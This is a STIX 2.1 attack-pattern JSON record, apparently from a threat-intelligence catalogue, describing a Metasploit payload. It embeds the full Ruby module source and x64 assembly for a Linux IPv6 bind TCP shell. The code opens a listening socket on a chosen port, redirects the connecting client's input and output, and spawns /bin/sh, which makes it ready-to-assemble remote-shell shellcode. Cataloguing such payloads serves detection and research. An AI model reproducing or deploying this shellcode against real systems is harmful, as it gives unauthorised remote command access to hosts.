{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46f88399-7f75-4c9d-b3b0-813d8c50a9ae",
    "created": "2024-08-14T16:33:19.463822Z",
    "modified": "2024-08-14T16:33:19.463825Z",
    "name": "Linux x64 Command Shell, Bind TCP Inline (IPv6)",
    "description": "Listen for an IPv6 connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/shell_bind_ipv6_tcp.rb",
            "external_id": "shell_bind_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 94\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux x64 Command Shell, Bind TCP Inline (IPv6)',\n      'Description'   => 'Listen for an IPv6 connection and spawn a command shell',\n      'Author'        => 'epi <epibar052[at]gmail.com>',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      ))\n\n    def generate(opts={})\n      # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb\n      port_order = ([1,0]) # byte ordering\n      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array\n      tcp_port.pop     # removes the first useless / from  the array\n      tcp_port.shift   # removes the last useless  / from  the array\n      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.\n\n      payload = <<-EOS\n          socket_call:\n            ; int socket(int domain, int type, int protocol)\n            push   0x29\n            pop    rax                          ; socket syscall\n            push   0xa\n            pop    rdi                          ; AF_INET6\n            push   0x1\n            pop    rsi                          ; SOCK_STREAM\n            xor    edx,edx                      ; auto-select protocol\n            syscall\n\n            push rax\n            pop rdi                             ; store socket fd\n\n        populate_sockaddr_in6:\n            ; struct sockaddr_in6 {\n            ;     sa_family_t     sin6_family;   /* AF_INET6 */\n            ;     in_port_t       sin6_port;     /* port number */\n            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */\n            ;     struct in6_addr sin6_addr;     /* IPv6 address */\n            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */\n            ; };\n\n            ; struct in6_addr {\n            ;     unsigned char   s6_addr[16];   /* IPv6 address */\n            ; };\n            cdq                                 ; zero-out rdx via sign-extension\n            push   rdx\n            push   rdx\n            push   rdx                          ; 24 bytes of sockaddr_in6, all 0x0\n            push.i16  0x#{tcp_port}             ; sin6_port\n            push.i16  0xa                       ; sin6_family\n            push   rsp\n            pop    rsi                          ; store pointer to struct\n\n        bind_call:\n            ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)\n            ; rdi -> fd already stored in rdi\n            ; rsi -> pointer to sockaddr_in6 struct already in rsi\n            push   0x31\n            pop    rax                          ; bind syscall\n            push   0x1c\n            pop    rdx                          ; length of sockaddr_in6 (28)\n            syscall\n\n        listen_call:\n            ; int listen(int sockfd, int backlog);\n            ; rdi -> fd already stored in rdi\n            push   0x32\n            pop    rax                          ; listen syscall\n            push   0x1\n            pop    rsi                          ; backlog\n            syscall\n\n        accept_call:\n            ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);\n            ; rdi -> fd already stored in rdi\n            push   0x2b\n            pop    rax                          ; accept syscall\n            cdq                                 ; zero-out rdx via sign-extension\n            push   rdx\n            push   rdx\n            push rsp\n            pop rsi                             ; when populated, client will be stored in rsi\n            push   0x1c\n            lea    rdx, [rsp]                   ; pointer to length of rsi (16)\n            syscall\n\n        dup2_calls:\n            ; int dup2(int oldfd, int newfd);\n            xchg    rdi, rax                    ; grab client fd\n            push   0x3\n            pop    rsi                          ; newfd \n\n        dup2_loop:\n            ; 2 -> 1 -> 0 (3 iterations)\n            push   0x21\n            pop    rax                          ; dup2 syscall\n            dec esi\n            syscall \n            loopnz   dup2_loop\n\n        exec_call:\n            ; int execve(const char *filename, char *const argv[], char *const envp[]);\n            push 0x3b\n            pop rax                             ; execve call\n            cdq                                 ; zero-out rdx via sign-extension\n            mov rbx, '/bin/sh'\n            push rbx\n            push rsp\n            pop rdi                             ; address of /bin/sh\n            syscall\n      EOS\n\n      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}